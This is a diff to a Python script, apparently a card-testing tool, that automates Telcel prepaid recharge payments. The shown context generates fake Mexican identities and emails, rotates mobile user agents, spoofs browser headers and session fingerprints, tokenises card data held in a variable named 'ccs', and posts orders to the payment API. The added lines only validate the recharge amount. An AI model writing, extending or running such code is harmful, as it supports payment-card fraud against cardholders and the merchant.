@@ -41,6 +41,7 @@ def get_montos(monto):
     paquete=next((p for p in data if p["monto"]==monto),None) # Obtiene un paquete general basandose en el mongo dado
     if paquete:
         return {'vigencia':paquete["vigencia"],'key_id':paquete["key"]}
+    return None
 ###########№########################################
 fake = Faker("es_MX")
 get_ua = lambda: UserAgent(platforms='mobile').random
@@ -86,6 +87,8 @@ def main(ccs, monto, num):
             headers = {"sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}",  "sec-ch-ua-mobile": "?1",  "user-agent": ua, "accept": "application/json, text/plain, */*", "content-type": "application/json", "sec-gpc": "1", "accept-language": "es-MX,es;q=0.6",  "origin": "https://paymentservice.telcel.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://paymentservice.telcel.com/payments/", "accept-encoding": "gzip, deflate, br, zstd", "priority": "u=1, i"}
             encDta= build(ccs); numc=encDta.get("token", ""); cvv=encDta.get("cvv", "");type=encDta.get('type','')
             resultm = get_montos(int(monto))
+            if not resultm:
+                return {"number": num, "monto": monto, "status": "Error ⚠️", "message": f"Monto inválido: selecciona un monto válido (20, 30, 50, 80, 100, 150, 200, 300, 500)"}
             data ={"isAuth": False, "service": { "type": "RECARGA", "operationType": 2, "productType": 1, "planType": 1, "productCode": "", "mdn": num,"region": 5,  "tipoPerfil": "AMIGO", "planName": "RECARGA_SALDO", "price": int(monto),  "idproduct": resultm["key_id"], "validity": resultm["vigencia"] }, "accountId": None,"email": email(),"fingerprint": { "organizationId": "gp9h38j0", "sessionId": sessionid, "webSession": web_sess }, "postalCode": post_code,"isSavedCard": False,"cardType": type,"tokenCard": numc,"lastDigits": ccs[12:-12]}
             res = session.post("https://paymentservice.telcel.com/api/services/recharge/prepareOrder", headers=headers, json=data)
             if "paymentId" in res.text:
